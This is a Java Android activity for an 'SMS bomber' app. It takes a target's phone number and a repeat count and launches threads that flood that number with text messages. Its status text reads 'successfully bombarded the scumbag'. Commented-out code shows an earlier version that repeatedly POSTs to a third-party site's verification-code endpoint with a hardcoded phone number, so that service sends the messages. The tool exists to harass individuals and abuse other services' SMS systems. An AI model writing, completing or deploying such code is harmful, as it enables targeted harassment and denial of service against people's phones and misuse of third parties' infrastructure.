package com.example.sendmessage;

import java.io.BufferedReader;
import com.example.thread.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;



import android.telephony.SmsManager;
import android.util.Log;
import android.app.Activity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	private boolean isRunning = true;
    private Button fireup,clear;
    private EditText number, times;
    private TextView showconsole;
    private Message message = null;
    private StringBuffer stringBuffer = new StringBuffer();
    
    //设置输出框中的内容
    private Handler handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                    switch (msg.what) {
                    case 0:
                    		stringBuffer.setLength(0);
                            stringBuffer.append(msg.obj +"\n");
                            showconsole.setText(stringBuffer);
                            stringBuffer.setLength(0);
                            break;
                    case 1:
                            stringBuffer.append(msg.obj + "\n");
                            showconsole.setText(stringBuffer);
                    }
            }

    };

    @Override
	protected void onCreate(Bundle savedInstanceState) {
		
		super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        showconsole = (TextView) findViewById(R.id.console);
        showconsole.setBackgroundColor(Color.BLACK);
        showconsole.setTextColor(Color.GREEN);
        showconsole.setText("输出信息："+"\n");
        fireup = (Button) findViewById(R.id.fireup);
        fireup.setOnClickListener(new ButtonClickListener());
        clear=(Button) findViewById(R.id.clear);
        clear.setOnClickListener(new ButtonClickListener());
        number = (EditText) findViewById(R.id.numberet);
        times = (EditText) findViewById(R.id.times);

	}
    
    /**
     * 设置开始轰炸/清空按钮功能
     * @author admin
     *
     */
    private final class ButtonClickListener implements View.OnClickListener {
		public void onClick(final View v) {
			new Thread(new Runnable() {
				@Override
				public void run() {
					   switch (v.getId()) {
				        case R.id.fireup:
			                String telnumber = number.getText().toString(); //手机号码
				    		String timesStr = times.getText().toString(); //次数
				    		if (timesStr.equals("") || timesStr == null) {
				    			  timesStr = "3";
				            }
				    		
			                if (telnumber.length() == 11) {
			                        message = new Message();
			                        message.obj = "请稍等......正在轰炸中......";
			                        message.what = 1;
			                        handler.sendMessage(message);
			                        try {
			                        	int num = Integer.valueOf(timesStr);
//			                        	Thread[] threads = new Thread[num];
//			                        	for (int i = 0; i < num; i++ ) {
//			                        		threads[i] = CreateThread.randomThread(telnumber);
//			                        	}
//			                        	
//			                        	for (int i = 0; i < threads.length; i++ ) {
//			                        		threads[i].start();
//			                        	}
			                        	num = CreateThread.randomThread(telnumber, num);
			                        	
				                    	message = new Message();
				                        message.obj = "成功轰炸人渣" + num + "条短信";
				                        message.what = 1;
				                        handler.sendMessage(message);
			        	    		} catch (Exception e) {
			        	    			// TODO Auto-generated catch block
			        	    			e.printStackTrace(System.err);
			        	    		}
			                } else {
			                	handler.post(new Runnable() {

									@Override
									public void run() {
										Toast.makeText(MainActivity.this, "电话号码格式不正确", Toast.LENGTH_SHORT).show();
										// TODO Auto-generated method stub
									}
			                		
			                	});
			                        }
			                break;
				        case R.id.clear:
				        	message = new Message();
	                        message.obj = "输出信息：";
	                        message.what = 0;
	                        handler.sendMessage(message);
//			                stringBuffer.setLength(0);
			                break;
				        default:
			                break;
				        }
					// TODO Auto-generated method stub
				}
			}).start();
	     
		}
   }
		
//	private final class ButtonClickListener implements View.OnClickListener {
//		public void onClick(View v) {
//	        switch (v.getId()) {
//	        case R.id.fireup:
//                if (telnumber.length() == 11) {
//                        message = new Message();
//                        message.obj = "请稍等......正在轰炸中......";
//                        message.what = 1;
//                        handler.sendMessage(message);
//                        
//                        //设置线程组
//                        ThreadGroup tg = new ThreadGroup("My Group");
//                        ThreadHttp[] threads;
//                        String[] websites = {"http://www.gamecomb.com/gamecomb2.0/control/interface/createicode.php>>post>>username=15029352949&hash=0.8045441617723554>>http://www.gamecomb.com/portal.php?mod=view&aid=36"};
//                        int countThread = 0;
//                        threads = new ThreadHttp[websites.length];
//                        for (String getwebsite : websites) {
//                                threads[countThread] = new ThreadHttp(tg, getwebsite);
//                                countThread++;
//                        }
//                        for (int i = 0; i < threads.length; i++) {
//                                threads[i].start();
//                        }
//                        String timeString = times.getText().toString();
//                        if (timeString.equals("") || timeString == null) {
//                                timeString = "1";
//                        }
//                        int countRun = 0;
//                        while (isRunning) {
//                                if (tg.activeCount() == 0) {
//                                        countThread = 0;
//                                        if (countRun == Integer.valueOf(timeString)) {
//                                                isRunning = false;
//                                                
//                                        }
//                                        threads = new ThreadHttp[websites.length];
//                                        for (String getwebsite : websites) {
//                                                threads[countThread] = new ThreadHttp(tg,
//                                                                getwebsite);
//                                                countThread++;
//                                        }
//                                        for (int i = 0; i < threads.length; i++) {
//                                                threads[i].start();
//                                        }
//                                        countRun++;
//                                }
//                        }
//                } else {
//                        Toast.makeText(MainActivity.this, "电话号码格式不正确", Toast.LENGTH_SHORT).show();
//                }
//                break;
//        case R.id.clear:
//                showconsole.setText(" ");
//                stringBuffer.setLength(0);
//                break;
//        default:
//                break;
//        }
//
//	}
	



//		public void onClick (View v) {
//			String num = phoneNumber.getText().toString();
//			String cont = content.getText().toString();
//			SmsManager messMana = SmsManager.getDefault();
//			ArrayList<String> datas = messMana.divideMessage(cont);
//			for (String data: datas) {
//				messMana.sendTextMessage(num, null, data, null, null);
//			}
//			Toast.makeText(MainActivity.this, R.string.success, Toast.LENGTH_LONG).show();
//		}
		
//	@Override
//	public boolean onCreateOptionsMenu(Menu menu) {
//		// Inflate the menu; this adds items to the action bar if it is present.
//		getMenuInflater().inflate(R.menu.main, menu);
//		return true;
//	}

//	@Override
//	public boolean onOptionsItemSelected(MenuItem item) {
//		// Handle action bar item clicks here. The action bar will
//		// automatically handle clicks on the Home/Up button, so long
//		// as you specify a parent activity in AndroidManifest.xml.
//		int id = item.getItemId();
//		if (id == R.id.action_settings) {
//			return true;
//		}
//		return super.onOptionsItemSelected(item);
//	}
}

